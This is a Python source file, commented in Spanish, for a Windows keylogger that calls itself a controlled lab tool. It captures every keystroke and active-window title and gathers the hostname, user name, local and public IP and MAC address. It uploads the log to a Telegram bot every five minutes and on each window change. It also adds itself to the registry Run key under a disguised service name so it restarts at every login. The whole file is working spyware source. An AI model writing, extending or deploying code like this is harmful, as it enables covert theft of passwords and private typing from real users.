"""
Keylogger de laboratorio controlado (v2).
- Registra TODAS las teclas (incluye caracteres especiales y símbolos)
- Guarda en %LOCALAPPDATA%\Recopilado.txt
- Incluye IP local, IP pública, hostname, usuario, MAC
- Envía por Telegram cada 5 min o al cambiar de ventana
- Salida visual en consola con colores
"""

import os
import re
import time
import socket
import platform
import winreg
import sys
import uuid
import threading
import ctypes
import requests
from datetime import datetime
from pynput import keyboard
from colorama import init, Fore, Style


init(autoreset=True)

# ==============================
# CONFIGURACIÓN
# ==============================
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID   = ""

SEND_INTERVAL = 300  # 5 minutos (segundos)

LOCALAPPDATA = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
LOG_FILE     = os.path.join(LOCALAPPDATA, "Recopilado.txt")

# ==============================
# ESTADO GLOBAL
# ==============================
last_window      = ""
last_send_time   = time.time()
session_header   = ""      # cabecera con info del equipo (se reescribe al inicio)
host_info_cache  = None    # cache para no repetir consultas

# ==============================
# MAPEO DE TECLAS ESPECIALES
# ==============================
SPECIAL_KEYS = {
    keyboard.Key.space:      " ",
    keyboard.Key.enter:      "\n",
    keyboard.Key.tab:        "\t",
    keyboard.Key.backspace:  "[⌫]",
    keyboard.Key.delete:     "[DEL]",
    keyboard.Key.esc:        "[ESC]",
    keyboard.Key.up:         "[↑]",
    keyboard.Key.down:       "[↓]",
    keyboard.Key.left:       "[←]",
    keyboard.Key.right:      "[→]",
    keyboard.Key.home:       "[HOME]",
    keyboard.Key.end:        "[END]",
    keyboard.Key.page_up:    "[PGUP]",
    keyboard.Key.page_down:  "[PGDN]",
    keyboard.Key.insert:     "[INS]",
    keyboard.Key.shift:      "[SHIFT]",
    keyboard.Key.shift_r:    "[SHIFT]",
    keyboard.Key.ctrl_l:     "[CTRL]",
    keyboard.Key.ctrl_r:     "[CTRL]",
    keyboard.Key.alt_l:      "[ALT]",
    keyboard.Key.alt_r:      "[ALT]",
    keyboard.Key.cmd:        "[WIN]",
    keyboard.Key.cmd_r:      "[WIN]",
    keyboard.Key.caps_lock:  "[CAPS]",
    keyboard.Key.num_lock:   "[NUM]",
    keyboard.Key.scroll_lock:"[SCRL]",
    keyboard.Key.print_screen:"[PRTSC]",
    keyboard.Key.pause:      "[PAUSE]",
    keyboard.Key.f1:  "[F1]",  keyboard.Key.f2:  "[F2]",
    keyboard.Key.f3:  "[F3]",  keyboard.Key.f4:  "[F4]",
    keyboard.Key.f5:  "[F5]",  keyboard.Key.f6:  "[F6]",
    keyboard.Key.f7:  "[F7]",  keyboard.Key.f8:  "[F8]",
    keyboard.Key.f9:  "[F9]",  keyboard.Key.f10: "[F10]",
    keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
}

# ==============================
# RECOLECCIÓN DE INFO DEL EQUIPO
# ==============================
def get_local_ip() -> str:
    """IP de la LAN. No requiere conexión a Internet real."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        # No se envía nada, solo se usa para saber qué interfaz usaría
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "desconocida"


def get_public_ip() -> str:
    """IP pública/real consultando varios servicios (failover)."""
    servicios = [
        ("https://api.ipify.org",                "text"),
        ("https://ifconfig.me/ip",               "text"),
        ("https://ipinfo.io/ip",                 "text"),
        ("https://api.my-ip.io/v2/ip.json",      "json"),  # devuelve {"ip": "..."}
    ]
    for url, kind in servicios:
        try:
            r = requests.get(url, timeout=5,
                             headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                if kind == "json":
                    data = r.json()
                    ip = data.get("ip") or data.get("address")
                    if ip:
                        return ip
                else:
                    ip = r.text.strip()
                    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip) or ":" in ip:
                        return ip
        except Exception:
            continue
    return "no disponible"


def get_mac() -> str:
    """MAC del equipo (puede no ser la de la interfaz activa, pero es única)."""
    try:
        mac = uuid.getnode()
        return ":".join(f"{(mac >> ele) & 0xff:02X}"
                        for ele in range(40, -1, -8))
    except Exception:
        return "desconocida"


def collect_host_info(use_cache: bool = True) -> dict:
    """Junta toda la info del host. Cachea la IP pública."""
    global host_info_cache
    if use_cache and host_info_cache:
        return host_info_cache

    info = {
        "hostname":    os.environ.get("COMPUTERNAME") or socket.gethostname(),
        "user":        os.environ.get("USERNAME") or os.environ.get("USER", "N/A"),
        "local_ip":    get_local_ip(),
        "public_ip":   get_public_ip(),
        "mac":         get_mac(),
        "os":          f"{platform.system()} {platform.release()} ({platform.version()})",
        "arch":        platform.machine(),
        "timestamp":   datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    host_info_cache = info
    return info


def build_session_header() -> str:
    """Cabecera visualmente atractiva que va al inicio del archivo."""
    i = collect_host_info(use_cache=False)
    sep = "=" * 70
    return (
        f"\n{sep}\n"
        f"  🖥️  REPORTE DE LABORATORIO CONTROLADO\n"
        f"{sep}\n"
        f"  🏷️  Equipo         : {i['hostname']}\n"
        f"  👤  Usuario        : {i['user']}\n"
        f"  🌐  IP local       : {i['local_ip']}\n"
        f"  📡  IP pública     : {i['public_ip']}\n"
        f"  🔗  MAC address    : {i['mac']}\n"
        f"  💻  Sistema        : {i['os']}\n"
        f"  ⚙️  Arquitectura   : {i['arch']}\n"
        f"  🕒  Inicio sesión  : {i['timestamp']}\n"
        f"{sep}\n\n"
    )


# ==============================
# UTILIDADES
# ==============================
def get_active_window_title() -> str:
    """Título de la ventana activa (Windows)."""
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value or "(sin título)"
    except Exception:
        return "(desconocida)"


def banner():
    print(Fore.MAGENTA + Style.BRIGHT + r"""
   ██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗
   ██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝
   █████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗
   ██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║
   ██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝
   ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝
        Laboratorio controlado - uso educativo
    """)
    print(Fore.CYAN + f"[i] Archivo destino: {LOG_FILE}")
    print(Fore.CYAN + f"[i] Envío automático cada {SEND_INTERVAL//60} min o al cambiar de ventana")
    print(Fore.YELLOW + "[i] Presiona ESC o Ctrl+C para salir\n")


def write_to_file(text: str):
    """Escribe en UTF-8 conservando cualquier carácter."""
    try:
        with open(LOG_FILE, "a", encoding="utf-8", errors="replace") as f:
            f.write(text)
            f.flush()
            os.fsync(f.fileno())
    except Exception as e:
        print(Fore.RED + f"[X] Error al escribir archivo: {e}")


def send_to_telegram():
    """Envía el archivo y lo vacía (mantiene la cabecera)."""
    global last_send_time
    if not (os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0):
        last_send_time = time.time()
        return

    if "TU_BOT" in TELEGRAM_BOT_TOKEN or "TU_CHAT" in TELEGRAM_CHAT_ID:
        print(Fore.YELLOW + "[!] Telegram no configurado (faltan token/chat_id)")
        last_send_time = time.time()
        return

    info = collect_host_info()
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        caption = (
            f"📄 *Recopilado.txt*\n"
            f"🖥️ Equipo: `{info['hostname']}`\n"
            f"👤 Usuario: `{info['user']}`\n"
            f"🌐 IP local: `{info['local_ip']}`\n"
            f"📡 IP pública: `{info['public_ip']}`\n"
            f"🔗 MAC: `{info['mac']}`\n"
            f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        with open(LOG_FILE, "rb") as f:
            files = {"document": ("Recopilado.txt", f, "text/plain")}
            data  = {"chat_id": TELEGRAM_CHAT_ID,
                     "caption": caption,
                     "parse_mode": "Markdown"}
            r = requests.post(url, files=files, data=data, timeout=30)

        if r.status_code == 200:
            print(Fore.GREEN + Style.BRIGHT +
                  f"\n[✓] Enviado a Telegram a las {datetime.now().strftime('%H:%M:%S')}")
            # Vaciar archivo pero dejar la cabecera para la siguiente sesión
            with open(LOG_FILE, "w", encoding="utf-8") as f:
                f.write(session_header)
        else:
            print(Fore.RED + f"\n[X] Error Telegram {r.status_code}: {r.text[:200]}")
    except Exception as e:
        print(Fore.RED + f"\n[X] Error al enviar a Telegram: {e}")
    finally:
        last_send_time = time.time()


def watcher_send():
    """Hilo que dispara envíos cada SEND_INTERVAL segundos."""
    while True:
        time.sleep(5)
        if time.time() - last_send_time >= SEND_INTERVAL:
            threading.Thread(target=send_to_telegram, daemon=True).start()


# ==============================
# MANEJO DE TECLAS
# ==============================
def on_press(key):
    global last_window
    try:
        current_window = get_active_window_title()
        if current_window != last_window:
            header = (
                f"\n\n{'-'*70}\n"
                f"[VENTANA] {current_window}\n"
                f"[FECHA]   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"{'-'*70}\n"
            )
            print(Fore.CYAN + Style.BRIGHT + header)
            write_to_file(header)
            last_window = current_window
            # Envío inmediato al cambiar de ventana (en hilo aparte)
            threading.Thread(target=send_to_telegram, daemon=True).start()

        if key in SPECIAL_KEYS:
            token = SPECIAL_KEYS[key]
        elif hasattr(key, "char") and key.char is not None:
            token = key.char
        else:
            token = f"[{str(key).replace('Key.', '').upper()}]"

        write_to_file(token)

        if token == "\n":
            print(Fore.GREEN + "⏎")
        elif token == " ":
            print(Fore.WHITE + "·", end="", flush=True)
        elif token.startswith("[") and token.endswith("]"):
            print(Fore.YELLOW + token, end="", flush=True)
        else:
            print(Fore.WHITE + token, end="", flush=True)

    except Exception as e:
        print(Fore.RED + f"\n[!] Error on_press: {e}")


def on_release(key):
    if key == keyboard.Key.esc:
        print(Fore.MAGENTA + "\n\n[i] Saliendo del laboratorio...")
        send_to_telegram()
        return False
# ==============================
# PERSISTENCIA
# ==============================
def install_persistence():
    """
    Registra este ejecutable en HKCU\...\Run para que se relance
    al iniciar sesión. Usa la ruta real del .exe (sys.executable)
    para no depender de rutas fijas.
    """
    try:
        # Si está empaquetado con PyInstaller, sys.executable es Cody.exe
        # Si se ejecuta como .py, usamos sys.executable (python.exe) + el script
        exe_path = sys.executable
        if not exe_path.lower().endswith(".exe"):
            return  # no persistir si no es un ejecutable

        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(
            key,
            "UPCQuestService",   # nombre discreto
            0,
            winreg.REG_SZ,
            f'"{exe_path}"'
        )
        winreg.CloseKey(key)
        print(Fore.GREEN + "[✓] Persistencia instalada en HKCU\\...\\Run")
    except Exception as e:
        print(Fore.RED + f"[X] No se pudo instalar persistencia: {e}")

# ==============================
# MAIN
# ==============================
def main():
    global session_header
    banner()

    install_persistence()

    print(Fore.CYAN + "[i] Recolectando información del equipo...")
    session_header = build_session_header()

    try:
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write(session_header)
    except Exception as e:
        print(Fore.RED + f"[X] No se pudo crear {LOG_FILE}: {e}")
        return

    # Mostrar la info recolectada en consola
    info = collect_host_info()
    print(Fore.GREEN + f"[✓] Equipo   : {info['hostname']}")
    print(Fore.GREEN + f"[✓] IP local : {info['local_ip']}")
    print(Fore.GREEN + f"[✓] IP púb.  : {info['public_ip']}")
    print(Fore.GREEN + f"[✓] MAC      : {info['mac']}\n")

    threading.Thread(target=watcher_send, daemon=True).start()

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.MAGENTA + "\n[i] Interrumpido por el usuario.")
        send_to_telegram()